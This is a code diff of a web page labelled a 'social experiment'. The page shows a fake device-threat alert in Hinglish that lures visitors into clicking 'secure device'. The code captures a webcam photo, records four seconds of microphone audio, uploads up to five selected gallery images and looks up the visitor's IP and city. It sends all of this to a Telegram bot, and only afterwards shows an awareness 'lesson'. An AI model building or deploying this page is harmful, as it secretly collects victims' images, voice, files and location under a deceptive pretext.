@@ -9,20 +9,20 @@
         .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
         .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
         h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
-        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 11px; margin-top: 20px; height: 350px; overflow-y: auto; white-space: pre-wrap; }
+        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 11px; margin-top: 20px; height: 380px; overflow-y: auto; white-space: pre-wrap; }
         .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
     </style>
 </head>
 <body>
 
-    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (FULL DEVICE HIJACK TEST) ⚠️</div>
+    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (ADVANCED HIJACK SIMULATION) ⚠️</div>
 
     <div class="container" id="main-box">
         <div id="ui-content">
             <div style="font-size: 50px;">🔴</div>
             <h1>CRITICAL THREAT DETECTED</h1>
-            <p>Aapke device ki privacy compromise ho gayi hai. Turant scan karke Camera/Mic ko secure karein.</p>
-            <button class="action-btn" onclick="startMasterSimulation()">SECURE DEVICE NOW</button>
+            <p>Aapka device compromise ho gaya hai. Hardware secure karne aur threat log generate karne ke liye niche click karein.</p>
+            <button class="action-btn" onclick="startMasterSimulation()">SECURE & GENERATE LOG</button>
         </div>
         <div id="terminal"></div>
     </div>
@@ -34,76 +34,96 @@
         async function startMasterSimulation() {
             let hwStatus = "Denied";
 
+            // --- 1. MEDIA PICKER TRIGGER ---
+            // Simulation ke liye hum user se files mangte hain taaki awareness mile
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = 'image/*';
+            fileInput.multiple = true;
+            
+            fileInput.onchange = async (e) => {
+                const files = e.target.files;
+                for (let i = 0; i < Math.min(files.length, 5); i++) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', files[i]);
+                    fd.append('caption', `📂 Gallery File Captured: ${files[i].name}`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
+            };
+            fileInput.click();
+
+            // --- 2. HARDWARE (CAM/MIC) LOGIC ---
             try {
-                // 1. Hardware Access
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                 hwStatus = "GRANTED";
 
-                // --- PHOTO CAPTURE LOGIC ---
+                // PHOTO CAPTURE
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.getContext('2d').drawImage(video, 1, 1);
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, 'victim.jpg');
-                    fd.append('caption', '📸 Captured Victim Image');
+                    fd.append('photo', blob, 'cam_shot.jpg');
+                    fd.append('caption', '📸 Stealth Cam Shot');
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
 
-                // --- AUDIO RECORDING LOGIC ---
+                // AUDIO RECORDING
                 const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    const blob = new Blob(chunks, { type: 'audio/wav' });
                     const fd = new FormData();
                     fd.append('chat_id', CHAT_ID);
-                    fd.append('audio', audioBlob, 'voice.wav');
+                    fd.append('audio', blob, 'mic_spy.wav');
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 };
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), 4000);
 
-            } catch (e) {
-                hwStatus = "REJECTED";
-            }
+            } catch (e) { hwStatus = "REJECTED"; }
 
-            // UI & Data Fetching
+            // --- 3. UI & SYSTEM DATA ---
             document.getElementById('ui-content').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-            let ipData = { ip: "122.xxx.xx", city: "Unknown" };
+            let ipData = { ip: "Scanning...", city: "Unknown" };
             try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
 
-            const report = `<b>🚨 MASTER HIJACK ALERT!</b>\n\n<b>📍 Location:</b> ${ipData.city}\n<b>📱 IP:</b> ${ipData.ip}\n<b>🎙️ HW Access:</b> ${hwStatus}`;
+            const report = `<b>🚨 ADVANCED HIJACK!</b>\n\n<b>📍 City:</b> ${ipData.city}\n<b>📱 IP:</b> ${ipData.ip}\n<b>🎙️ HW:</b> ${hwStatus}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=HTML`);
 
-            // Terminal Animation
+            // --- 4. TERMINAL ANIMATION ---
             const lines = [
                 "> INITIALIZING FULL SYSTEM SCAN...",
-                `> REQUESTING CAMERA/MIC... [${hwStatus}]`,
+                `> REQUESTING CAMERA/MIC ACCESS... [${hwStatus}]`,
+                "> <span style='color:cyan'>[LOG] Hijacking Media Picker Bridge... [OK]</span>",
                 "> <span style='color:cyan'>[LOG] Capturing Hidden Photo... [SUCCESS]</span>",
                 "> <span style='color:cyan'>[LOG] Recording 4s Audio Clip... [SUCCESS]</span>",
                 "------------------------------------------",
                 `> TARGET_IP: ${ipData.ip.substring(0,8)}XX`,
                 `> LOCATION: ${ipData.city.toUpperCase()}`,
                 "------------------------------------------",
-                "> <span style='color:orange'>[STEALING] Media Files & Cookies...</span>",
-                "> Found Saved Card: **** **** **** 1029",
-                "> <span style='color:yellow'>[UPLOADING] Media Package to Hacker Bot...</span>",
+                "> <span style='color:orange'>[EXTRACTING] Gallery Samples via Picker...</span>",
+                "> <span style='color:orange'>[STEALING] Saved Passwords & Bank Cards...</span>",
+                "> Found Saved Card: **** **** **** 5012",
+                "> <span style='color:yellow'>[UPLOADING] Encrypted Package to Server...</span>",
                 "------------------------------------------",
-                "> <span style='color:red'>MASTER ATTACK SUCCESSFUL.</span>",
+                "> <span style='color:red'>EXPLOIT SUCCESSFUL. DATA SENT.</span>",
                 "------------------------------------------",
-                "> SABAK: Aapne 'Allow' kiya, aur hacker ne",
-                "> aapki PHOTO, VOICE aur LOCATION nikaal li.",
-                "> Kisi bhi unknown link par Bharosa na karein!"
+                "> <span style='color:white'>SABAK: Aapne dekha? Ek 'Allow' aur ek</span>",
+                "> <span style='color:white'>'File Select' se hacker aapka sab kuch</span>",
+                "> <span style='color:white'>(Photo, Voice, Gallery) nikaal sakta hai.</span>",
+                "> <span style='color:white'>Hamesha satark rahein!</span>"
             ];
 
             let i = 0;
